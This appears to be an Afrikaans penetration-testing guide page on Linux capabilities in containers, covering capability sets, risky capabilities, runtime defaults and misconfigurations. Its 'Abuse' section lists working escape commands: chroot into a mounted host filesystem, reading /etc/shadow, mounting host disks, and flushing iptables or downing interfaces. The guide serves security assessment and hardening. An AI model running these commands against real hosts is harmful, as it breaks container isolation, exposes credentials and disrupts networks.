# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux capabilities is een van die belangrikste dele van container security omdat dit ’n subtiele maar fundamentele vraag beantwoord: **wat beteken "root" werklik binne ’n container?** Op ’n normale Linux-stelsel het UID 0 histories ’n baie breë stel privileges geïmpliseer. In moderne kernels word daardie privilege opgebreek in kleiner eenhede genaamd capabilities. ’n Process kan as root loop en steeds baie kragtige operasies ontbreek indien die relevante capabilities verwyder is.

Containers maak sterk staat op hierdie onderskeid. Baie workloads word steeds as UID 0 binne die container geloods weens compatibility- of eenvoudredes. Sonder capability dropping sou dit heeltemal te gevaarlik wees. Met capability dropping kan ’n containerized root process steeds baie gewone in-container-take uitvoer, terwyl dit toegang tot meer sensitiewe kernel-operasies geweier word. Daarom beteken ’n container shell wat `uid=0(root)` wys nie outomaties "host root" of selfs "breë kernel privilege" nie. Die capability sets bepaal hoeveel daardie root identity werklik werd is.

Vir die volledige Linux capability reference en baie abuse-voorbeelde, sien:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Werking

Capabilities word in verskeie sets nagespoor, insluitend permitted, effective, inheritable, ambient en bounding sets. Vir baie container assessments is die presiese kernel-semantiek van elke set minder onmiddellik belangrik as die finale praktiese vraag: **watter bevoorregte operasies kan hierdie process nou suksesvol uitvoer, en watter toekomstige privilege gains is nog moontlik?**

Die rede waarom dit saak maak, is dat baie breakout techniques eintlik capability-probleme is wat as container-probleme vermom word. ’n Workload met `CAP_SYS_ADMIN` kan toegang kry tot ’n enorme hoeveelheid kernel functionality waaraan ’n normale container root process nie behoort te raak nie. ’n Workload met `CAP_NET_ADMIN` word baie gevaarliker indien dit ook die host network namespace deel. ’n Workload met `CAP_SYS_PTRACE` word baie interessanter indien dit host processes deur host PID sharing kan sien. In Docker of Podman kan dit as `--pid=host` verskyn; in Kubernetes verskyn dit gewoonlik as `hostPID: true`.

Met ander woorde, die capability set kan nie in isolasie geëvalueer word nie. Dit moet saam met namespaces, seccomp en MAC policy gelees word.

## Lab

’n Baie direkte manier om capabilities binne ’n container te inspekteer, is:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Jy kan ook ’n meer beperkende container vergelyk met een waaraan alle capabilities bygevoeg is:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Om die effek van ’n beperkte toevoeging te sien, probeer om alles te verwyder en slegs een capability terug te voeg:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Hierdie klein eksperimente help wys dat ’n runtime nie bloot ’n boolean genaamd "privileged" aan- of afskakel nie. Dit vorm die werklike privilege-oppervlak wat vir die proses beskikbaar is.

## Hoërisiko-Capabilities

Hoewel baie capabilities, afhangend van die teiken, belangrik kan wees, is ’n paar herhaaldelik relevant in container escape-analise.

**`CAP_SYS_ADMIN`** is die een wat defenders met die meeste agterdog moet hanteer. Dit word dikwels beskryf as "the new root" omdat dit ’n enorme hoeveelheid funksionaliteit ontsluit, insluitend mount-verwante operasies, namespace-sensitiewe gedrag en baie kernel-paaie wat nooit onverskillig aan containers blootgestel behoort te word nie. As ’n container `CAP_SYS_ADMIN`, swak seccomp en geen sterk MAC-confinement het nie, word baie klassieke breakout-paaie veel meer realisties.

**`CAP_SYS_PTRACE`** is belangrik wanneer process visibility bestaan, veral as die PID namespace met die host of met interessante naburige workloads gedeel word. Dit kan visibility in tampering omskep.

**`CAP_NET_ADMIN`** en **`CAP_NET_RAW`** is belangrik in network-gefokusde omgewings. Op ’n geïsoleerde bridge network kan hulle reeds riskant wees; op ’n gedeelde host network namespace is hulle veel erger omdat die workload moontlik host networking kan herkonfigureer, verkeer kan sniff, spoof of met plaaslike traffic flows kan inmeng.

**`CAP_SYS_MODULE`** is gewoonlik katastrofies in ’n rootful-omgewing omdat die laai van kernel modules effektief host-kernel-beheer beteken. Dit behoort byna nooit in ’n general-purpose container workload voor te kom nie.

## Runtime-gebruik

Docker, Podman, containerd-based stacks en CRI-O gebruik almal capability controls, maar die defaults en management interfaces verskil. Docker stel hulle baie direk bloot deur flags soos `--cap-drop` en `--cap-add`. Podman stel soortgelyke controls bloot en trek dikwels voordeel uit rootless execution as ’n bykomende safety layer. Kubernetes stel capability additions en drops deur die Pod- of container-`securityContext` bloot. System-container-omgewings soos LXC/Incus maak ook staat op capability control, maar die breër host integration van daardie systems verlei operators dikwels om defaults aggressiewer te verslap as wat hulle in ’n app-container-omgewing sou doen.

Dieselfde beginsel geld oor almal heen: ’n capability wat tegnies moontlik is om toe te ken, is nie noodwendig een wat toegeken behoort te word nie. Baie werklike incidents begin wanneer ’n operator ’n capability byvoeg bloot omdat ’n workload onder ’n strenger configuration misluk het en die span ’n vinnige fix nodig gehad het.

## Misconfigurations

Die mees ooglopende fout is **`--cap-add=ALL`** in Docker/Podman-style CLIs, maar dit is nie die enigste een nie. In die praktyk is ’n meer algemene probleem die toekenning van een of twee uiters kragtige capabilities, veral `CAP_SYS_ADMIN`, om "die toepassing te laat werk" sonder om ook die namespace-, seccomp- en mount-implikasies te verstaan. Nog ’n algemene failure mode is die kombinasie van ekstra capabilities met host namespace sharing. In Docker of Podman kan dit as `--pid=host`, `--network=host` of `--userns=host` verskyn; in Kubernetes verskyn die ekwivalente exposure gewoonlik deur workload-settings soos `hostPID: true` of `hostNetwork: true`. Elkeen van hierdie kombinasies verander wat die capability werklik kan beïnvloed.

Dit is ook algemeen om te sien dat administrators glo dat ’n workload, omdat dit nie volledig `--privileged` is nie, steeds betekenisvol beperk word. Soms is dit waar, maar soms is die effektiewe posture reeds naby genoeg aan privileged dat die onderskeid operasioneel ophou saak maak.

## Abuse

Die eerste praktiese stap is om die effektiewe capability set te enumerateer en onmiddellik die capability-spesifieke actions te toets wat vir escape of host information access relevant sou wees:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
As `CAP_SYS_ADMIN` teenwoordig is, toets eers mount-gebaseerde misbruik en toegang tot die gasheer se lêerstelsel, omdat dit een van die algemeenste ontsnappingsfasiliteerders is:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Indien `CAP_SYS_PTRACE` teenwoordig is en die container interessante prosesse kan sien, verifieer of die capability in prosesinspeksie omskep kan word:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Indien `CAP_NET_ADMIN` of `CAP_NET_RAW` teenwoordig is, toets of die werklading die sigbare netwerkstack kan manipuleer of ten minste nuttige netwerkinligting kan insamel:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wanneer 'n capability-toets slaag, kombineer dit met die namespace-situasie. 'n Capability wat in 'n geïsoleerde namespace bloot riskant lyk, kan onmiddellik 'n escape of host-recon primitive word wanneer die container ook host PID, host network of host mounts deel.

### Volledige voorbeeld: `CAP_SYS_ADMIN` + Host Mount = Host Escape

As die container `CAP_SYS_ADMIN` en 'n skryfbare bind mount van die host-lêerstelsel, soos `/host`, het, is die escape path dikwels eenvoudig:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
As `chroot` suksesvol is, word opdragte nou in die konteks van die gasheer se root-lêerstelsel uitgevoer:
```bash
id
hostname
cat /etc/shadow | head
```
Indien `chroot` nie beskikbaar is nie, kan dieselfde resultaat dikwels bereik word deur die binary via die gemounte boom aan te roep:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Volledige voorbeeld: `CAP_SYS_ADMIN` + Toegang tot toestelle

As ’n bloktoestel vanaf die host blootgestel word, kan `CAP_SYS_ADMIN` dit in direkte toegang tot die host se lêerstelsel omskep:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Volledige voorbeeld: `CAP_NET_ADMIN` + Host-netwerking

Hierdie kombinasie lewer nie altyd direk host root op nie, maar dit kan die host-netwerkstack volledig herkonfigureer:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit kan denial of service, traffic interception of toegang tot dienste wat voorheen gefiltreer is, moontlik maak.

## Checks

Die doel van die capability checks is nie net om rou waardes te dump nie, maar om te verstaan of die proses genoeg privilege het om sy huidige namespace- en mount-situasie gevaarlik te maak.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Wat hier interessant is:

- `capsh --print` is die maklikste manier om hoërisiko-capabilities soos `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, of `cap_sys_module` raak te sien.
- Die `CapEff`-reël in `/proc/self/status` wys wat tans werklik effektief is, nie net wat moontlik in ander stelle beskikbaar is nie.
- ’n Capability-dump word baie belangriker as die container ook host PID-, netwerk- of user namespaces deel, of skryfbare host mounts het.

Nadat die rou capability-inligting ingesamel is, is die volgende stap interpretasie. Vra of die proses root is, of user namespaces aktief is, of host namespaces gedeel word, of seccomp afdwingend is, en of AppArmor of SELinux steeds die proses beperk. ’n Capability-stel op sy eie is slegs deel van die verhaal, maar dit is dikwels die deel wat verduidelik waarom een container breakout werk en ’n ander een met dieselfde oënskynlike beginpunt misluk.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Verminderde capability-stel by verstek | Docker behou ’n verstek-allowlist van capabilities en verwyder die res | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Verminderde capability-stel by verstek | Podman-containers is by verstek unprivileged en gebruik ’n verminderde capability-model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erf runtime-verstekwaardes tensy dit verander word | Indien geen `securityContext.capabilities` gespesifiseer word nie, kry die container die verstek-capability-stel van die runtime | `securityContext.capabilities.add`, versuim om `drop: [\"ALL\"]` te gebruik, `privileged: true` |
| containerd / CRI-O onder Kubernetes | Gewoonlik runtime-verstekwaarde | Die effektiewe stel hang van die runtime plus die Pod-specifikasie af | dieselfde as die Kubernetes-ry; direkte OCI/CRI-konfigurasie kan ook capabilities eksplisiet byvoeg |

Vir Kubernetes is die belangrike punt dat die API nie een universele verstek-capability-stel definieer nie. Indien die Pod nie capabilities byvoeg of verwyder nie, erf die workload die runtime-verstekwaarde vir daardie node.
{{#include ../../../../banners/hacktricks-training.md}}
